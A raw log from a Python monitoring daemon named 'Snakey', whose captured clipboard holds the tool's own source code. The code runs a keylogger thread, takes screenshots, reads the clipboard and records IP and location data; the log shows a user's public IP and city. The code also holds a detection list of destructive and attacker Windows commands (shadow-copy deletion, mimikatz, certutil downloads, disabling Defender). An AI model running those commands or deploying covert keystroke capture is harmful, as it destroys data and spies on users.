populated from global KEYLOGGER_KEYS\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n            logger.warning(f\"Could not get private IP: {e}\", extra={\"error\": str(e)})\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip: str | None = None\r\n        current_country: str | None = None\r\n        try:\r\n            ip_info_response = requests_get(\"https://ipinfo.io/json\", timeout=5)\r\n            ip_info_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)\r\n            ip_info = ip_info_response.json()\r\n\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if current_country and current_country not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {current_country}\")\r\n                logger.info(f\"Access from untrusted country: {current_country}\", extra={\"country\": current_country})\r\n\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            logger.warning(\"IP info lookup timed out.\", extra={\"error_type\": \"ipinfo_timeout\"})\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            logger.error(f\"IP info lookup failed: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_request_error\"})\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            logger.error(f\"Unexpected error during IP info lookup: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_unexpected_error\"})\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info collection error: {e}\")\r\n        logger.error(f\"System info collection error: {e}\", exc_info=True)\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(str(session_log[\"clipboard\"])) # Ensure clipboard is string before hashing\r\n\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            logger.error(f\"Clipboard error: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        logger.info(\"Clipboard collection skipped (not Windows).\")\r\n\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_file_path = os.path.join(base_path, screenshot_information)\r\n    if platform.system() == \"Windows\":\r\n        # Check disk space before attempting screenshot\r\n        if not check_disk_space(base_path, MIN_FREE_DISK_MB):\r\n            session_log[\"alerts\"].append(\"Screenshot skipped due to low disk space.\")\r\n            logger.warning(\"Screenshot skipped due to low disk space.\")\r\n        else:\r\n            try:\r\n                im = ImageGrab.grab()\r\n                im.save(screenshot_file_path)\r\n                session_log[\"screenshot_taken\"] = True\r\n                session_log[\"screenshot_hash\"] = hash_file(screenshot_file_path)\r\n\r\n                vt_result = vt_lookup_file(screenshot_file_path)\r\n                if vt_result:\r\n                    session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                    if vt_result.get(\"malicious\", 0) > 0:\r\n                        session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                        logger.info(f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n                else:\r\n                    logger.info(\"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n            except Exception as e:\r\n                session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n                logger.error(f\"Screenshot error: {e}\", exc_info=True)\r\n            finally:\r\n                if os.path.exists(screenshot_file_path):\r\n                    try:\r\n                        os.remove(screenshot_file_path)\r\n                        logger.debug(f\"Removed temporary screenshot file: {screenshot_file_path}\")\r\n                    except Exception as e:\r\n                        logger.error(f\"Failed to remove temporary screenshot file: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n        logger.info(\"Screenshot collection skipped (not Windows).\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith((\"http://\", \"https://\")):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                logger.info(f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n        else:\r\n            logger.info(\"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger: Collect accumulated keys from the dedicated keylogger thread\r\n    global KEYLOGGER_KEYS\r\n    session_log[\"keystrokes\"] = ''.join(KEYLOGGER_KEYS)\r\n    KEYLOGGER_KEYS = [] # Reset for the next collection cycle\r\n    logger.info(f\"Collected {len(session_log['keystrokes'])} keystrokes from keylogger thread.\")\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    if not check_disk_space(encrypted_path, MIN_FREE_DISK_MB):\r\n        session_log[\"alerts\"].append(\"Encryption and ledger update skipped due to low disk space.\")\r\n        logger.error(\"Encryption and ledger update skipped due to low disk space in encrypted_path.\")\r\n        return session_log # Exit without updating ledger for this log\r\n\r\n    try:\r\n        # 1. Prepare the full log for encryption\r\n        log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n        session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)\r\n\r\n        # 2. Encrypt the entire session log\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file (Atomic Write)\r\n        temp_enc_file_path = os.path.join(encrypted_path, f\".{encrypted_filename}.tmp\")\r\n        try:\r\n            with tempfile.NamedTemporaryFile(mode='wb', delete=False, dir=encrypted_path) as temp_f: # mode 'wb' for binary data\r\n                temp_f.write(encrypted_log_data)\r\n            shutil.move(temp_f.name, full_encrypted_filepath)\r\n            logger.info(f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n        except Exception as e:\r\n            logger.error(f\"Failed to save encrypted log atomically: {e}\", exc_info=True, extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(f\"Failed to save encrypted log: {e}\")\r\n            if os.path.exists(temp_enc_file_path):\r\n                os.remove(temp_enc_file_path)\r\n            return session_log # Critical failure, return\r\n\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            logger.error(\"Failed to hash encrypted log file. Ledger will not be updated with this log.\", extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(\"Failed to hash encrypted log file. Ledger not updated.\")\r\n            return session_log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger: list[dict] = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\", encoding='utf-8') as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed (list of hashes -> list of dicts)\r\n                    if ledger and isinstance(ledger[0], str):\r\n                        logger.info(\"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": datetime.now(timezone.utc).isoformat(), # Use current time for legacy entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        logger.info(\"Legacy hash ledger converted successfully.\")\r\n                except json.JSONDecodeError:\r\n                    logger.warning(\"Existing hash ledger file is corrupt. Starting with empty ledger.\", extra={\"file_path\": hash_ledger_path})\r\n                    ledger = []\r\n                except Exception as e:\r\n                    logger.error(f\"Error loading/converting hash ledger: {e}. Starting with empty ledger.\", exc_info=True, extra={\"file_path\": hash_ledger_path})\r\n                    ledger = [] # Start fresh on unexpected error\r\n\r\n            # Determine previous_encrypted_file_hash robustly\r\n            previous_encrypted_file_hash = \"0\" * 64\r\n            if ledger:\r\n                last_entry = ledger[-1]\r\n                if isinstance(last_entry, dict) and \"encrypted_file_hash\" in last_entry:\r\n                    previous_encrypted_file_hash = last_entry[\"encrypted_file_hash\"]\r\n                else:\r\n                    logger.warning(\"Last entry in hash ledger is malformed or missing 'encrypted_file_hash'. Using default previous hash ('0'*64).\", extra={\"last_ledger_entry\": str(last_entry)}) # Convert last_entry to str to avoid issues if it's complex/non-serializable\r\n            \r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            # Save the updated ledger (Atomic Write)\r\n            temp_ledger_path = os.path.join(base_path, \"hash_ledger_temp.json\")\r\n            try:\r\n                with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f:\r\n                    json.dump(ledger, temp_f, indent=4)\r\n                shutil.move(temp_f.name, hash_ledger_path)\r\n                logger.info(\"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n            except Exception as e:\r\n                logger.error(f\"Atomic write failed for hash ledger: {e}\", exc_info=True, extra={\"temp_path\": temp_ledger_path, \"target_path\": hash_ledger_path})\r\n                session_log[\"alerts\"].append(f\"Failed to update hash ledger atomically: {e}\")\r\n                if os.path.exists(temp_f.name):\r\n                    os.remove(temp_f.name)\r\n                # Fallback: try non-atomic write (less safe)\r\n                try:\r\n                    with open(hash_ledger_path, \"w\", encoding='utf-8') as f:\r\n                        json.dump(ledger, f, indent=4)\r\n                    logger.warning(\"Hash ledger updated with non-atomic write due to previous error.\", extra={\"target_path\": hash_ledger_path})\r\n                except Exception as fallback_e:\r\n                    logger.error(f\"Failed to write hash ledger even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": hash_ledger_path})\r\n                    session_log[\"alerts\"].append(f\"CRITICAL: Failed to write hash ledger even with fallback: {fallback_e}\")\r\n\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            if merkle_root:\r\n                # Save the Merkle root (Atomic Write)\r\n                temp_merkle_path = os.path.join(base_path, \"merkle_root_temp.txt\")\r\n                try:\r\n                    with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f_merkle:\r\n                        temp_f_merkle.write(merkle_root)\r\n                    shutil.move(temp_f_merkle.name, merkle_root_path)\r\n                    logger.info(\"Merkle root saved (based on encrypted file hashes).\")\r\n                except Exception as e:\r\n                    logger.error(f\"Atomic write failed for Merkle root: {e}\", exc_info=True, extra={\"temp_path\": temp_merkle_path, \"target_path\": merkle_root_path})\r\n                    session_log[\"alerts\"].append(f\"Failed to save Merkle root atomically: {e}\")\r\n                    if os.path.exists(temp_f_merkle.name):\r\n                        os.remove(temp_f_merkle.name)\r\n                    # Fallback\r\n                    try:\r\n                        with open(merkle_root_path, \"w\", encoding='utf-8') as f:\r\n                            f.write(merkle_root)\r\n                        logger.warning(\"Merkle root updated with non-atomic write due to previous error.\", extra={\"target_path\": merkle_root_path})\r\n                    except Exception as fallback_e:\r\n                        logger.error(f\"Failed to write Merkle root even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": merkle_root_path})\r\n                        session_log[\"alerts\"].append(f\"CRITICAL: Failed to write Merkle root even with fallback: {fallback_e}\")\r\n            else:\r\n                logger.warning(\"Merkle root could not be built (no hashes).\")\r\n\r\n\r\n        except Exception as e:\r\n            logger.error(f\"Failed to update hash ledger or Merkle root: {e}\", exc_info=True)\r\n            session_log[\"alerts\"].append(f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        logger.error(f\"Encryption or encrypted file save error: {e}\", exc_info=True)\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    logger.info(\"Starting Snakey in daemon mode...\")\r\n\r\n    # Start keylogger in a separate, persistent daemon thread\r\n    keylogger_thread = threading.Thread(target=keylogger_thread_func, daemon=True)\r\n    keylogger_thread.start()\r\n    logger.info(\"Keylogger thread initialized.\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        logger.info(\"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            logger.error(f\"Failed to remove existing stop file: {e}\", exc_info=True)\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            logger.info(\"Snakey terminated by stop_snakey.txt file.\")\r\n            # Gracefully stop keylogger thread\r\n            if KEYLOGGER_LISTENER:\r\n                logger.info(\"Stopping keylogger listener.\")\r\n                KEYLOGGER_LISTENER.stop()\r\n            break # Exit main loop\r\n\r\n        try:\r\n            session_log = collect_full_session() # Gathers all data, encrypts, updates ledger\r\n\r\n            # Send data to Elasticsearch (if connected)\r\n            send_to_elasticsearch(session_log)\r\n\r\n            # Save data to local JSON log file\r\n            save_session_to_json(session_log, json_log_path)\r\n\r\n            # Log to Wazuh-compatible file\r\n            log_to_wazuh_file(session_log)\r\n\r\n        except Exception as e:\r\n            logger.critical(f\"An unhandled error occurred in the main daemon loop: {e}\", exc_info=True)\r\n            # No `extra` here, as this is the top-level handler\r\n            session_log[\"alerts\"].append(f\"CRITICAL: Unhandled error in main loop: {e}\") # Add to log if possible\r\n\r\n        # Sleep for the configured interval\r\n        logger.info(f\"Sleeping for {config['time_sleep_seconds']} seconds before next collection at {datetime.now(timezone.utc).isoformat()}...\")\r\n        time.sleep(config['time_sleep_seconds'])\r\n\r\n    logger.info(\"Snakey daemon has stopped.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7bc953bbeac424b0f7d619989809cc46fb5a20586088b9b928a23e5c1b18d547", "screenshot_hash": "f987844c23375acca2f65219c19bc3f6c400326e1692bbc5f319164b9a1e673e", "_raw_log_hash": "585459958d7b15c236c41cfe57133d9aa9adbd1521254d756596965721584ea1"}
{"timestamp": "2025-06-11T17:09:28.504395+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport sys\r\nimport threading\r\nimport shutil\r\nimport traceback\r\nimport logging\r\nfrom logging.handlers import RotatingFileHandler, TimedRotatingFileHandler\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get as requests_get, post as requests_post # Renamed to avoid conflict with `get` from `requests`\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Still needed for general requests like ipinfo.io\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException, TransportError\r\nimport ssl # Not directly used for client, but good to have\r\nimport tempfile # For atomic writes\r\n\r\n\r\n# === Configuration Loading ===\r\n# Default configuration values\r\nDEFAULT_CONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    \"known_countries\": [\"Portugal\"], # Example country for testing\r\n    \"known_vpn_ips\": [\"89.214.145.78\", \"123.45.67.89\"], # Example VPN IPs\r\n    \"elastic_host\": \"localhost\",\r\n    \"elastic_port\": 9200,\r\n    \"log_level\": \"INFO\", # DEBUG, INFO, WARNING, ERROR, CRITICAL\r\n    \"time_sleep_seconds\": 3, # Main daemon loop sleep interval\r\n    \"min_free_disk_mb\": 100, # Minimum free disk space to operate\r\n    \"vt_api_key\": None, # Should be loaded from ENV\r\n    \"elastic_user\": None, # Should be loaded from ENV\r\n    \"elastic_password\": None # Should be loaded from ENV\r\n}\r\n\r\n# --- Paths derived from config ---\r\n# These will be set after config is loaded\r\nconfig = {} # Placeholder, will be populated by load_config\r\n\r\n# --- Global Keylogger Variables ---\r\nKEYLOGGER_KEYS = []\r\nKEYLOGGER_LISTENER = None # Will hold the pynput Listener instance\r\nKEYLOGGER_STOP_EVENT = threading.Event() # To signal the keylogger thread to stop\r\n\r\n# === Logger Setup (using Python's logging module) ===\r\n# This needs to be set up early before any `logger.info` calls\r\nlogger = logging.getLogger('snakey_daemon')\r\n\r\nclass JsonFormatter(logging.Formatter):\r\n    \"\"\"Custom JSON formatter for structured logs.\"\"\"\r\n    def format(self, record):\r\n        log_record = {\r\n            \"timestamp\": datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),\r\n            \"level\": record.levelname,\r\n            \"message\": record.getMessage(),\r\n            \"logger_name\": record.name,\r\n        }\r\n        if record.exc_info:\r\n            log_record[\"exception\"] = self.formatException(record.exc_info)\r\n        if record.funcName:\r\n            log_record[\"function\"] = record.funcName\r\n        if record.lineno:\r\n            log_record[\"line\"] = record.lineno\r\n        if record.pathname:\r\n            log_record[\"file\"] = record.pathname\r\n        \r\n        # Add any extra dictionary fields passed to the logger via the 'extra' keyword\r\n        if hasattr(record, 'extra') and isinstance(record.extra, dict):\r\n            # The 'extra' dictionary contains the keys directly, so just update\r\n            log_record.update(record.extra)\r\n\r\n        return json.dumps(log_record, default=str) # default=str handles datetime, etc.\r\n\r\ndef setup_logging(log_level_str, log_file_path):\r\n    \"\"\"Configures the main logger for the daemon.\"\"\"\r\n    try:\r\n        logger.setLevel(getattr(logging, log_level_str.upper()))\r\n    except AttributeError:\r\n        logger.setLevel(logging.INFO) # Default to INFO if level is invalid\r\n        logger.warning(f\"Invalid SNAKEY_LOG_LEVEL '{log_level_str}'. Defaulting to INFO.\")\r\n\r\n    # Prevent adding handlers multiple times if setup_logging is called more than once\r\n    if not logger.handlers:\r\n        # File Handler with Time-based Rotation (daily)\r\n        file_handler = TimedRotatingFileHandler(log_file_path,\r\n                                                when=\"midnight\",\r\n                                                interval=1, # Rotate daily\r\n                                                backupCount=5) # Keep up to 5 rotated log files\r\n        file_handler.setLevel(logging.DEBUG) # Log all debug messages to file\r\n        file_handler.setFormatter(JsonFormatter())\r\n        logger.addHandler(file_handler)\r\n\r\n        # Console Handler\r\n        console_handler = logging.StreamHandler(sys.stdout)\r\n        console_handler.setLevel(logging.INFO) # Only INFO and above to console\r\n        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\r\n        console_handler.setFormatter(console_formatter)\r\n        logger.addHandler(console_handler)\r\n\r\n# Global exception handler to log any unhandled exceptions\r\ndef handle_unhandled_exception(exc_type, exc_value, exc_traceback):\r\n    if issubclass(exc_type, KeyboardInterrupt):\r\n        # Don't log KeyboardInterrupt, let default handler deal with it\r\n        sys.__excepthook__(exc_type, exc_value, exc_traceback)\r\n        return\r\n    logger.critical(\"Unhandled exception caught!\", exc_info=(exc_type, exc_value, exc_traceback))\r\n\r\nsys.excepthook = handle_unhandled_exception\r\n\r\ndef load_config(config_file_path: str) -> dict:\r\n    \"\"\"Loads configuration from a JSON file and environment variables.\"\"\"\r\n    loaded_config = DEFAULT_CONFIG.copy()\r\n\r\n    if os.path.exists(config_file_path):\r\n        try:\r\n            with open(config_file_path, \"r\", encoding='utf-8') as f:\r\n                file_config = json.load(f)\r\n                loaded_config.update(file_config)\r\n            logger.info(f\"Configuration loaded from {config_file_path}\")\r\n        except json.JSONDecodeError:\r\n            logger.error(f\"Error decoding config file {config_file_path}. Using default values.\")\r\n        except IOError as e:\r\n            logger.error(f\"Error reading config file {config_file_path}: {e}. Using default values.\")\r\n        except Exception as e:\r\n            logger.critical(f\"Unexpected error parsing config file: {e}\", exc_info=True)\r\n            sys.exit(1) # Critical error, exit\r\n\r\n    # Override with Environment Variables for sensitive info (best practice)\r\n    loaded_config[\"vt_api_key\"] = os.getenv(\"SNAKEY_VT_API_KEY\", loaded_config[\"vt_api_key\"])\r\n    loaded_config[\"elastic_user\"] = os.getenv(\"SNAKEY_ELASTIC_USER\", loaded_config[\"elastic_user\"])\r\n    loaded_config[\"elastic_password\"] = os.getenv(\"SNAKEY_ELASTIC_PASSWORD\", loaded_config[\"elastic_password\"])\r\n    loaded_config[\"log_level\"] = os.getenv(\"SNAKEY_LOG_LEVEL\", loaded_config[\"log_level\"]).upper()\r\n\r\n    return loaded_config\r\n\r\n# === Global Variables (Initialized after config loading) ===\r\nconfig_file = os.path.join(DEFAULT_CONFIG[\"base_path\"], \"snakey_config.json\")\r\nconfig = load_config(config_file)\r\n\r\n# Now define paths and settings using the loaded config\r\nbase_path = config[\"base_path\"]\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True) # Ensure directory exists\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon.log\") # Changed name to avoid conflict with existing (error) log\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = set(config[\"known_countries\"]) # Use set for faster lookups\r\nKNOWN_VPN_IPS = set(config[\"known_vpn_ips\"]) # Use set for faster lookups\r\nMIN_FREE_DISK_MB = config[\"min_free_disk_mb\"]\r\n\r\n# --- VirusTotal API Endpoints (Global Constants) ---\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\n\r\n\r\n# Sensitive Command Detection Configuration\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\", \"del /s /q\", \"rmdir /s /q\", \"net user\", \"net localgroup administrators\",\r\n    \"taskkill /f /im\", \"schtasks /create\", \"reg delete\", \"mimikatz\",\r\n    \"certutil -urlcache -f -split\", \"wmic shadowcopy delete\", \"vssadmin delete shadows\",\r\n    \"powershell -nop -w hidden -c\", \"invoke-expression\", \"set-mppreference -disablerealtimemonitoring $true\",\r\n    \"bcdedit /set {current} safeboot network\", \"mshta.exe http\", \"bitsadmin /transfer\",\r\n    \"wevtutil cl system\", \"cipher /w\", \"sdelete -z\",\r\n]\r\n\r\n# === Setup Logging (now that config is loaded) ===\r\nsetup_logging(config[\"log_level\"], daemon_log_file)\r\n\r\n\r\n# === Encryption Key Loading ===\r\nfernet: Fernet = None # Type hint\r\nif not os.path.exists(key_path):\r\n    logger.critical(\"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    sys.exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    logger.info(\"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    logger.critical(f\"Failed to load encryption key: {e}. Exiting.\", exc_info=True)\r\n    sys.exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = config[\"elastic_host\"]\r\nELASTIC_PORT = config[\"elastic_port\"]\r\nELASTIC_USER = 